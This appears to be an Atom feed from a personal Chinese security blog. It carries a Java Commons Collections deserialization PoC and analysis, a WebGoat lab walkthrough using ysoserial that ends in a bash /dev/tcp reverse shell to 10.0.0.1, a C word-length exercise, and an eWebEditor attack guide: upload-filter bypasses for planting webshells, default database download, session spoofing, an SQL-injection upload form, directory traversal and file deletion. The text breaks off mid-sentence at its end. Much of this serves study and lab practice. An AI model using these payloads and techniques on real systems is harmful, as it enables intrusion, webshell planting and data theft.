<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>零点维度</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://budebao.github.io/"/>
  <updated>2018-11-17T04:32:51.774Z</updated>
  <id>http://budebao.github.io/</id>
  
  <author>
    <name>零点</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://budebao.github.io/2018/11/17/Commons%20CollectionsPoc%E5%87%BD%E6%95%B0%E9%93%BE%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>http://budebao.github.io/2018/11/17/Commons CollectionsPoc函数链执行过程分析/</id>
    <published>2018-11-17T04:17:14.212Z</published>
    <updated>2018-11-17T04:32:51.774Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="title-Commons-CollectionsPoc函数链执行过程分析"><a href="#title-Commons-CollectionsPoc函数链执行过程分析" class="headerlink" title="title:Commons CollectionsPoc函数链执行过程分析"></a>title:Commons CollectionsPoc函数链执行过程分析</h2><pre><code>import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.Transformer;import java.lang.StringBuffer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;</code></pre><a id="more"></a><pre><code>import org.apache.commons.collections.map.TransformedMap;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Iterator;import java.util.Map;import java.util.Set;public class Main{public  static  void main(String[] args){Transformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;, new Class[0]}),new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]}),new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class},new Object[]{&quot;calc&quot;})};Transformer chain = new ChainedTransformer(transformers) ;Map innerMap = new HashMap() ;innerMap.put(&quot;name&quot;, &quot;hello&quot;) ;Map outerMap = TransformedMap.decorate(innerMap, null, chain) ;Map.Entry elEntry = (Map.Entry) outerMap.entrySet().iterator().next() ;elEntry.setValue(&quot;hello&quot;) ;}}</code></pre><p>&nbsp;&nbsp;这是POC代码<br><br>&nbsp;&nbsp;下面看一下这个POC具体的执行过程<br><br>&nbsp;&nbsp;1，第一步创建一个Transformer类型的数组，由于ConstantTransformer和InvokerTransformer<br>都是Transfromer派生的子类,因而能够被添加到Transformer数组中,创建这个数组的目的就是把后面要执行的函数放入里面，也就构成了一个函数链<br><br>&nbsp;&nbsp;2,第二步就是把transformers当做参数创建一个chainedTransformer对象,而chainedTransformer类有个方法就是就是将一个函数数组链式的执行。<br><br>&nbsp;&nbsp;3,     <code>Map innerMap = new HashMap() ;                   innerMap.put(&quot;name&quot;, &quot;hello&quot;) ;                   Map outerMap = TransformedMap.decorate(innerMap, null, chain) ;</code><br>这三行代码先创建一个Map对象，并用TransformedMap将这个用上面创建的chain函数执行链对Map对象进行包装，<br><br><br>&nbsp;&nbsp;4,<code>Map.Entry elEntry = (Map.Entry) outerMap.entrySet().iterator().next() ;</code><br>将Map中的键和值作为对象存在set集合中，并使用迭代器获取一个对象<br><br>&nbsp;&nbsp;5,<code>elEntry.setValue(&quot;hello&quot;) ;</code>修改这个对象的值。看一下这个方法的代码。<br><br><img src="https://s1.ax1x.com/2018/11/16/ixqcKx.png" alt="ixqcKx.png"><br><br>&nbsp;&nbsp;修改值会触发ChainedTransformer的transform也就是会触发函数的链式执行<br><br><img src="https://s1.ax1x.com/2018/11/16/ixLAdU.png" alt="ixLAdU.png"><br><br><a href="https://imgchr.com/i/izpgsJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/16/izpgsJ.md.png" alt="izpgsJ.md.png"></a><br></p><p><br><br>&nbsp;&nbsp;第一次执行，传入的是字符串对象”hello”,即传入object为”hello”,object = this.iTransformers[i].transform(object);执行数组中的第一个对象为 new ConstantTransformer(Runtime.class),.transform(object),ConstantTransformer类的transform的方法为返回iConstant，而这里的iconstant是Runtime.class一个类的对象,object随之也被赋值为Runtime.class.<br><br><a href="https://imgchr.com/i/izpWZR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/16/izpWZR.md.png" alt="izpWZR.md.png"></a><br><br><br><a href="https://imgchr.com/i/izVOeO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izVOeO.md.png" alt="izVOeO.md.png"></a><br><br><br>第二次执行,传入的参数为java.lang.Runtime,执行数组中第二个对象的transform的方法，第二个对象类型InvokerTransformer，所以执行InvokerTransformer类的tranforms方法，<br><br>先是获取一个java.lang的类,借用java的反射机制获取类的方法这里获取的是Class类的get<br>method方法，然后用invoke执行getmethod方法获取getRuntime类的对象并作为返回值返回,object的值为变为<br>getRuntime类的对象，<br><br><br><br><a href="https://imgchr.com/i/izmhTS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izmhTS.md.png" alt="izmhTS.md.png"></a><br><br><a href="https://imgchr.com/i/izmIYQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izmIYQ.md.png" alt="izmIYQ.md.png"></a><br><br><br>第三次执行传入的参数为getRuntime类的对象，数组第三个对象也是<br>InvokerTransformer类的对象，执行InvokerTransformer类的transform方法，获取一个java.lang.reflect<br>.method类，获取invoke方法，然后执行 invoke(java.lang.Runtime.getRuntime,new Object[]{null, new Object[0]})返回java.lang.Runtime对象，并赋给object,<br><br><a href="https://imgchr.com/i/izm7Ss" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izm7Ss.md.png" alt="izm7Ss.md.png"></a><br><br><br><a href="https://imgchr.com/i/izmbyq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izmbyq.md.png" alt="izmbyq.md.png"></a><br><br><br>第四次执行,传入的参数为java.lang.Runtime,，数组第四个对象也是<br>InvokerTransformer类的对象,执行InvokerTransformer类的transform方法,获取到java.lang.runtime类<br>，获取ava.lang.runtime类中的exec方法，最后执行method.invoke(“Runtime,new object[]{“calc”})<br>成功弹出计算器。<br><a href="https://imgchr.com/i/izmqO0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/17/izmqO0.md.png" alt="izmqO0.md.png"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;h2 id=&quot;title-Commons-CollectionsPoc函数链执行过程分析&quot;&gt;&lt;a href=&quot;#title-Commons-CollectionsPoc函数链执行过程分析&quot; class=&quot;headerlink&quot; title=&quot;title:Commons CollectionsPoc函数链执行过程分析&quot;&gt;&lt;/a&gt;title:Commons CollectionsPoc函数链执行过程分析&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.Transformer;
import java.lang.StringBuffer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>java反序列漏洞，及从java-deserialization-from-discovery-to-reverse-shell-on-limited-environments收获的东西</title>
    <link href="http://budebao.github.io/2018/11/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%8F%8A%E4%BB%8Ejava-deserialization-from-discovery-to-reverse-shell-on-limited-environments%E6%94%B6%E8%8E%B7%E7%9A%84%E4%B8%9C%E8%A5%BF/"/>
    <id>http://budebao.github.io/2018/11/03/java反序列漏洞，及从java-deserialization-from-discovery-to-reverse-shell-on-limited-environments收获的东西/</id>
    <published>2018-11-03T08:01:23.605Z</published>
    <updated>2018-11-03T16:22:02.907Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-docker-一个开源的应用容器引擎"><a href="#1-docker-一个开源的应用容器引擎" class="headerlink" title="1.docker-一个开源的应用容器引擎"></a>1.docker-一个开源的应用容器引擎</h2><p>&nbsp;&nbsp;百度百科：Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。<br><br>&nbsp;&nbsp;之前我是没有用过docker这个应用容器的,都是先配置所需环境。然后把源码，文件放入环境中。而docker直接省去了很多麻烦，只要docker镜像库中有所需的打包好的应用程序。你就可以通过docker简单的几个命令安装，运行。</p><p>#linux：docker的安装<br><a id="more"></a></p><p>简单几个命令即可<br><br>&nbsp;&nbsp;1,更新源<br><br>&nbsp;&nbsp;&nbsp;<code>sudo apt-get update</code><br><br>&nbsp;&nbsp;2,安装docker.io<br><br>&nbsp;&nbsp;&nbsp;<code>sudo apt-get install docker.io</code>  </p><p>#docker的命令<br>&nbsp;1. <code>docker pull webgoat/webgoat-8.0</code><br><br>&nbsp;2. <code>docker run -p 8080:8080 -it webgoat/webgoat-8.0</code> /<br>home/webgoat/start.sh <br><br>执行成功之后就是下面的界面<br><br><a href="https://imgchr.com/i/i5C2kt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5C2kt.md.png" alt="i5C2kt.md.png"></a><br><br><br><br>&nbsp;&nbsp;&nbsp;8080:8080 前面是主机端口，后面是容器端口<br><br>&nbsp;&nbsp;home/weggoat/start.不是必要的，但是有了之后。加载速度会很快<br><br>&nbsp;1 docker pull  镜像名<br><br>&nbsp;&nbsp;&nbsp;从镜像仓库抓取指定镜像<br><br>&nbsp;2 run<br><br>&nbsp;&nbsp;docker run [OPTIONS] IMAGE [COMMAND] [ARG…]<br>OPTIONS说明：<br>-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</p><p>-d: 后台运行容器，并返回容器ID；</p><p>-i: 以交互模式运行容器，通常与 -t 同时使用；</p><p>-p: 端口映射，格式为：主机(宿主)端口:容器端口</p><p>-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</p><p>–name=”nginx-lb”: 为容器指定一个名称；</p><p>–dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致；</p><p>–dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致；</p><p>-h “mars”: 指定容器的hostname；</p><p>-e username=”ritchie”: 设置环境变量；</p><p>–env-file=[]: 从指定文件读入环境变量；</p><p>–cpuset=”0-2” or –cpuset=”0,1,2”: 绑定容器到指定CPU运行；</p><p>-m :设置容器使用内存最大值；</p><p>–net=”bridge”: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；</p><p>–link=[]: 添加链接到另一个容器；</p><p>–expose=[]: 开放一个端口或一组端口；</p><p>##2.burpsuite-java反序列化的插件-Java-Deserialization-Scanner</p><p>#burpsuite安装插件<br>&nbsp;&nbsp;1.打开extender<br><br><a href="https://imgchr.com/i/i5CIXQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5CIXQ.md.png" alt="i5CIXQ.md.png"></a><br>&nbsp;&nbsp;&nbsp;直接点击安装即可</p><p>##3.maven（打包编译java项目）<br>&nbsp;&nbsp;&nbsp;<br>主要是基于xml来动态构建的，所以原文中需要改pomxml文件来添加<br>javax.el包<br><br>常用命令：<br><br>mvn clean 清除项目目录中的生成结果<br><br>mvn package 根据项目生成jar <br><br>mvn -D skipTests 会跳过测试类<br></p><p>##4.反弹shell原理<br>&nbsp;&nbsp;之前只会用 bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1<br>这一条语句。这次看到 exec 5&lt;&gt;/dev/tcp/10.0.0.1/8888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done 就不会了<br>于是又看了一下 shell命令和 shell反弹原理<br><br><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a> <br><br><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></p><p>###webgoat实战过程<br>&nbsp;&nbsp;&nbsp;1.先截一下包<br><a href="https://imgchr.com/i/i5CRtP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5CRtP.md.png" alt="i5CRtP.md.png"></a><br><a href="https://imgchr.com/i/i5CWff" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5CWff.md.png" alt="i5CWff.md.png"></a><br><br><br>&nbsp;&nbsp;&nbsp;2 转发到Dserialization-Scanner<br><br><a href="https://imgchr.com/i/i5CMWT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5CMWT.md.png" alt="i5CMWT.md.png"></a><br><br><br>&nbsp;&nbsp;&nbsp;3 选择插入点测试<br><br><a href="https://imgchr.com/i/i5CdfK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5CdfK.md.png" alt="i5CdfK.md.png"></a><br><br><br>最下面的一排，表示选中的数据是以什么格式编码的， 倒数第2排的那个下拉框，选择判断漏洞是否存在使用的方式，这里选择 Sleep模式，然后 点击 Attack（BASE64），等一阵就有结果了<br><a href="https://imgchr.com/i/i5CAyQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5CAyQ.md.png" alt="i5CAyQ.md.png"></a><br><br><br>可以看到，检测出了hibernate 5 漏洞<br><br><br>输入命令进行攻击<br><br><br><a href="https://imgchr.com/i/i5Cmoq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5Cmoq.md.png" alt="i5Cmoq.md.png"></a><br><a href="https://imgchr.com/i/i5C1lF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5C1lF.md.png" alt="i5C1lF.md.png"></a><br><br><br>发现出错<br><br><br>通过定位,发现在Java-Deserialization-Scanner的所有的检测逻辑都是硬编码的，那么ysoserial生成Payload却会出错的原因就在于ysoserial本身了。经过定位分析，发现是在生成Hibernate Payload时，缺少javax.el包，所以我们需要直接下载ysoserial的源码然后在pom.xml中加入这个包的依赖，最后手动编译。关于这个问题，作者提供提交了一个pull request。(原文翻译)<br><br>如下修改<br><br><a href="https://imgchr.com/i/i5Cymd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5Cymd.md.png" alt="i5Cymd.md.png"></a><br 使用maven重新编译打包<="" br=""><br><code>mvn clean package -DskipTests -Dhibernate5</code><br><br>打包成功后会在target目录下生成ysoserial-0.0.6-SNAPSHOT.jar和ysoserial-0.0.6-SNAPSHOT-all.jar<br>尝试生成payload<br><br>    <code>java -Dhibernate5 -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 &quot;touch /tmp/test&quot; | base64 -w0</code><br><a href="https://imgchr.com/i/i5C60A" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5C60A.md.png" alt="i5C60A.md.png"></a><br><br>网页输入框没啥限制，直接从那里输入。<br><br><a href="https://imgchr.com/i/i5CaY6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5CaY6.md.png" alt="i5CaY6.md.png"></a><br>通过docker exec -it <container_id> /bin/bash进入到Docker容器的内部查看是否生成了/tmp/test文件。<br><br><a href="https://imgchr.com/i/i5CTmj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5CTmj.md.png" alt="i5CTmj.md.png"></a><br><br>存在test文件,命令成功执行，攻击成功<br></container_id></p><p>#反弹shell<br>&nbsp;&nbsp;首先看一下docker中能执行的命令<br><br><a href="https://imgchr.com/i/i5CBlD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5CBlD.md.png" alt="i5CBlD.md.png"></a><br>发现存在perl和bash命令。我们可以用bash反弹shell<br><br><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code><br><br>不过作者最终用的却不是这个<br><br>之后修改一下生成payload的代码<br><br><img src="https://github.com/budebao/photo/blob/master/cmd.png" alt=""><a href="https://imgchr.com/i/i5CD6e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5CD6e.md.png" alt="i5CD6e.md.png"></a><code>String [] cmd={&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;ln -s exe1 exe2&quot;};</code><br>需要改一下代码<br><br>最终的代码<br><br><code>String cmd = &quot;java.lang.Runtime.getRuntime().exec(new String []{\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/8888;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\&quot;}).waitFor();&quot;;</code><br><br>修改完毕之后，运行mvn clean package -DskipTests -Dhibernate5重新编译ysoserial。<br></p><p>#反弹shell利用<br>得到新的ysoserial之后运行java -Dhibernate5 -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 “anything” | base64 -w0，得到Payload<br><br><a href="https://imgchr.com/i/i5CcTI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5CcTI.md.png" alt="i5CcTI.md.png"></a><br><br>在网页中输入payload,成功拿到shell<br><br><a href="https://imgchr.com/i/i5C0SO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/03/i5C0SO.md.png" alt="i5C0SO.md.png"></a></p><p>##参考<br>&nbsp;&nbsp;1 <a href="https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef" target="_blank" rel="noopener">https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-docker-一个开源的应用容器引擎&quot;&gt;&lt;a href=&quot;#1-docker-一个开源的应用容器引擎&quot; class=&quot;headerlink&quot; title=&quot;1.docker-一个开源的应用容器引擎&quot;&gt;&lt;/a&gt;1.docker-一个开源的应用容器引擎&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;百度百科：Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。&lt;br&gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;之前我是没有用过docker这个应用容器的,都是先配置所需环境。然后把源码，文件放入环境中。而docker直接省去了很多麻烦，只要docker镜像库中有所需的打包好的应用程序。你就可以通过docker简单的几个命令安装，运行。&lt;/p&gt;
&lt;p&gt;#linux：docker的安装&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>单词长度</title>
    <link href="http://budebao.github.io/2018/04/11/%E5%8D%95%E8%AF%8D%E9%95%BF%E5%BA%A6/"/>
    <id>http://budebao.github.io/2018/04/11/单词长度/</id>
    <published>2018-04-11T11:33:00.398Z</published>
    <updated>2018-04-11T12:43:58.870Z</updated>
    
    <content type="html"><![CDATA[<p> 单词长度</p><p>你的程序要读入一行文本，其中以空格分隔为若干个单词，以.结束。你要输出每个单词的长度。这里的单词与语言无关，可以包括各种符号，比如it’s算一个单词，长度为4。注意，行中可能出现连续的空格；最后的.不计算在内。<br><a id="more"></a><br>输入格式：</p><p>输入在一行中给出一行文本，以.结束</p><p>提示：用scanf(“%c”,…);来读入一个字符，直到读到.为止。</p><p>输出格式：</p><p>在一行中输出这行文本对应的单词的长度，每个长度之间以空格隔开，行末没有最后的空格。</p><p>输入样例：</p><p>It’s great to see you here.<br>输出样例：</p><p>4 5 2 3 3 4</p><hr><pre><code> #include&lt;stdio.h&gt;   int main(){    int len;    int flag;    char c;    len=0;    flag=0;                     //用来标记前面有无打印过的单词//    while((c=getchar())!=&apos;.&apos;)     {        if(c!=&apos; &apos;)               //记录单词的长度//        {            len++;        }        else if(len)                    {            if(flag)            {                putchar(&apos; &apos;);    //打印单词长度//            }        printf(&quot;%d&quot;,len);        flag=1;                                len=0;                   //打印单词长度之后将计数器归0//        }    }    if(flag&amp;&amp;len)                //flag=0和len&gt;0的特殊情况也就是只有一个单词的情况//    {                 putchar(&apos; &apos;);    }      if(len)    {        printf(&quot;%d&quot;,len);    }     return 0; }</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; 单词长度&lt;/p&gt;
&lt;p&gt;你的程序要读入一行文本，其中以空格分隔为若干个单词，以.结束。你要输出每个单词的长度。这里的单词与语言无关，可以包括各种符号，比如it’s算一个单词，长度为4。注意，行中可能出现连续的空格；最后的.不计算在内。&lt;br&gt;
    
    </summary>
    
    
      <category term="C语言" scheme="http://budebao.github.io/tags/C%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>ewebeditor在线编辑器漏洞</title>
    <link href="http://budebao.github.io/2018/03/21/ewebeditor%E5%9C%A8%E7%BA%BF%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"/>
    <id>http://budebao.github.io/2018/03/21/ewebeditor在线编辑器漏洞/</id>
    <published>2018-03-21T13:07:35.026Z</published>
    <updated>2018-04-11T12:43:17.061Z</updated>
    
    <content type="html"><![CDATA[<p>##1:默认管理后台:<br><a href="http://127.0.0.1/ewebeditor/admin_login.asp" target="_blank" rel="noopener">http://127.0.0.1/ewebeditor/admin_login.asp</a><br>后台如果能进入:<br>      <a id="more"></a><br>可点击样式管理:<br>standard 拷贝一份(直接修改改不了)<br>在拷贝的一份里加入图片类型( asa aaspsp ) 然后点预览<br>在编辑器里点设计 然后直接上传asa大马.<br>上传后 在代码里可以看到马的位置!<br>(原理:因为在iis里 网站的属性里 应用程序配置一项 asa扩展名还是用asp.dll来解析的,asp也是 还有 cer cdx )<br>在cer cdx asa的被删掉 那么马儿就找不到 映射不过去.<br>可以在拷贝过后的样式 图片类型里加入 aaspsp 然后在上传 直接就可以上传asp文件<br>—————————————————————————–</p><p>##2:下载默认数据库<br>127.0.0.1/ewebeditor/db/ewebeditor.mdb<br>然后分析数据库<br>webeditor_system(1) 就可以看到用户名和密码 如果破解不出来<br>可以在webeditor_style(14 样式表里<br>主要看允许上传文件的扩展名(s-fileext s_ingeext)<br>看到一个小黑客曾经搞过 多了asa aaspsp<br>可以用他来利用!(后台找不到的情况下也可以用此方法)<br> 可以构造语句:<br>比如 ID=46 s-name =standard1<br>构造 代码: ewebeditor.asp?id=content&amp;style=standard<br>ID和和样式名改过后<br>ewebeditor.asp?id=46&amp;style=standard1<br>然后就是进入编辑器 上传asa 或者asp的 得到webshell<br>前面的1跟2说的是asp版的ewebeditor,其他如php,jsp跟asp的差不多,这里不多说.<br>针对这种方法可能出现的问题:<br>(1)．使用默认用户名和密码无法登录。<br>请试试直接下载db目录下的ewebeditor.mdb文件，用户名和密码在eWebEditor_System表中，经过了md5加密，如果无法下载或者无法<em>**</em>，那就当自己的运气不好了。<br>(2)．加了asa类型后发现还是无法上传。<br>应该是站长懂点代码，自己修改了Upload.asp文件，但是没有关系，按照常人的思维习惯，往往会直接在sAllowExt = Replace(UCase(sAllowExt), “ASP”, “”)一句上修改，我就看见过一个站长是这样修改的：<br>sAllowExt = Replace(Replace(Replace(Replace(Replace(UCase(sAllowExt), “ASP”, “”), “CER”, “”), “ASA”, “”), “CDX”, “”), “HTR”, “”)<br>猛一看什么都过滤了，但是我们只要在上传类型中增加“aaspsp”，就可以直接上传asp文件了。呵呵，是不是天才的想法？“aaspsp”过滤了“asp”字符后，反而变成了“asp”！顺便告诉大家一个秘密，其实动网论坛7.0 sp2中也可以利用类似的方法绕过对扩展名的过滤。<br>(3)．上传了asp文件后，却发现该目录没有运行脚本的权限。<br>呵呵，真是好笨啊，上传类型可以改，上传路径不是也可以修改的吗？<br>(4)．已经使用了第2点中的方法，但是asp类型还是无法上传。<br>看来站长肯定是一个写asp的高手，但是我们还有最后一招来对付他：看到“远程类型”了吗？eWebEditor能够设定自动保存远程文件的类型，我们可以加入asp类型。但是如何才能让远程访问的asp文件能够以源码形式保存呢？方法是很多的，最简单的方法是将IIS中的“应用文件映射”中的“asp”删除。<br>漏洞原理<br>漏洞的利用原理很简单，请看Upload.asp文件：<br>任何情况下都不允许上传asp脚本文件<br>sAllowExt = Replace(UCase(sAllowExt), “ASP”, “”)<br>因为eWebEditor仅仅过滤了ASP文件。记得我第一次使用eWebEditor时就在纳闷：既然作者已经知道asp文件需要过滤，为什么不同时过滤asa、cer等文件呢？也许这就是对免费用户不负责任的表现吧！<br>—————————————————————————–</p><p>##3.eWebEditor session欺骗漏洞<br>eWebEditor在线编辑器<br>漏洞文件:Admin_Private.asp<br>漏洞语句:&lt;%<br>If Session(“eWebEditor_User”) = “” Then<br>Response.Redirect “admin_login.asp”<br>Response.End<br>End If<br>只判断了session，没有判断cookies和路径的验证问题。<br>漏洞利用:<br>新建一个h4x0r.asp内容如下:<br>&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;<br>访问h4x0r.asp，再访问后台任何文件，for example:Admin_Default.asp<br>漏洞影响:虚拟主机的克星.</p><p>##4.ewebeditor asp版 2.1.6 上传漏洞<br>    </p><h1>ewebeditor asp版 2.1.6 上传漏洞利用程序</h1><br><br>    <form action="”http://127.1/e/upload.asp?action=save&type=IMAGE&style=luoye’" union="" select="" s_id,s_name,s_dir,s_css,s_uploaddir,s_width,s_height,s_memo,s_issys,s_fileext,s_flashext,="" [s_imageext]%2b’|cer’,s_mediaext,s_filesize,s_flashsize,s_imagesize,s_mediasize,s_stateflag,s_detectfromword,s_initmode,s_baseurl="" from="" ewebeditor_style="" where="" s_name="’standard’and’a’=’a”" method="post" name="myform" enctype="”multipart/form-data”"><br>    <input type="file" name="uploadfile" size="100"><br><br><br>    <input type="submit" value="Fuck"><br>    </form><br><a href="http://127.1/e/upload.asp" target="_blank" rel="noopener">http://127.1/e/upload.asp</a><br>上传时修改此处上传地址。。。<br>如果你是上传的asp文件则成功后的地址为：<br><a href="http://127.1/e/uploadfile/xxxxxxxxxx.asp" target="_blank" rel="noopener">http://127.1/e/uploadfile/xxxxxxxxxx.asp</a><br>—————————————————————————–<p></p><p>##5.ewebeditor遍历路径漏洞<br>Ewebeditor为非常常见的网站核心程序,<br>默认数据库为 /db/ewebeditor.mdb 默认路径admin_login.asp 默认管理员admin密码admin(admin888)<br>ewebedit进入后台添加样式.得到webshell很容易. 有时候很不幸.管理员把数据库改为只读权限.<br>但是ewebeditor后台有个小小的缺陷. 可以历遍整个网站目录. 当然.数据库为只读的时候一样可以利用.<br>上传文件管理—选择样式目录(随便选一个目录)<br>得到:<br>ewebeditor/admin_uploadfile.asp?id=14<br>在id=14后面添加&amp;dir=..<br>再加 &amp;dir=../..<br>&amp;dir=../../../.. 看到整个网站文件了<br>—————————————————————————–</p><p>##6.eweb2.7版本以下又一个注入<br>    首先看代码(ewebeditor.asp)：<br>    ub InitPara()<br>    ‘ 取全屏标志<br>    sFullScreen = Trim(Request.QueryString(“fullscreen”))<br>    ‘ 取对应的内容ID<br>    sContentID = Trim(Request.QueryString(“id”))<br>    If sContentID = “” Then ShowErr “请传入调用参数ID，即隐藏的内容表单项ID！”<br>    ‘ 取样式初始值<br>    sStyleName = Trim(Request.QueryString(“style”))<br>    If sStyleName = “” Then sStyleName = “standard”<br>    sSql = “select <em> from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘”<br>    oRs.Open sSql, oConn, 0, 1<br>    If Not oRs.Eof Then<br>    sStyleID = oRs(“S_ID”)<br>    sStyleName = oRs(“S_Name”)<br>    sStyleDir = oRs(“S_Dir”)<br>    sStyleCSS = oRs(“S_CSS”)<br>    sStyleUploadDir = oRs(“S_UploadDir”)<br>    nStateFlag = oRs(“S_StateFlag”)<br>    sDetectFromWord = oRs(“S_DetectFromWord”)<br>    sInitMode = oRs(“S_InitMode”)<br>    sBaseUrl = oRs(“S_BaseUrl”)<br>    sStyleUploadDir = Replace(sStyleUploadDir, “”, “/”)<br>    If Right(sStyleUploadDir, 1) &lt;&gt; “/” Then<br>    sStyleUploadDir = sStyleUploadDir &amp; “/”<br>    End If<br>    Else<br>    ShowErr “无效的样式Style参数传入，如果要使用默认值，请留空！”<br>    End If<br>    oRs.Close<br>关键的是这两句：<br>sStyleName = Trim(Request.QueryString(“style”))<br>If sStyleName = “” Then sStyleName = “standard”<br>sSql = “select </em> from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘”<br>很明显的是style参数没有足够的过滤，如果我们自己给这个地方赋值的话，程序会报错的，<br>但接下来的一句还是让我们有可乘之机，If sStyleName = “” Then sStyleName = “standard”保留默认的还是会带入语句执行，加个单引号就报错了，如图2.[local]1[/local]<br>我试了好几款工具，发现只有pangolin可以注入，啊D只能发现注入不能继续猜解。<br>eweb默认的管理员表是：ewebeditor_system<br>这个表下的默认两个列名为:sys_UserName和sys_userpass<br>需要手动添加，<br>—————————————————————————–</p><p>##7.ewebeditor2.8最终版删除任意文件漏洞<br>这个漏洞可以很鸡肋，也可以很致命，关键看你怎么利用！<br>此漏洞存在于ExampleNewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入，看这些代码：<br>‘ 把带”|”的字符串转为数组<br>Dim aSavePathFileName<br>aSavePathFileName = Split(sSavePathFileName, “|”)<br>‘ 删除新闻相关的文件，从文件夹中<br>Dim i<br>For i = 0 To UBound(aSavePathFileName)<br>‘ 按路径文件名删除文件<br>Call DoDelFile(aSavePathFileName(i))<br>Next<br>而aSavePathFileName是前面从数据库取出来的：<br>sSavePathFileName = oRs(“D_SavePathFileName”)<br>看看D_SavePathFileName是怎么添加到数据库里的，在addsave.asp(modifysave.asp)里：<br>sSavePathFileName = 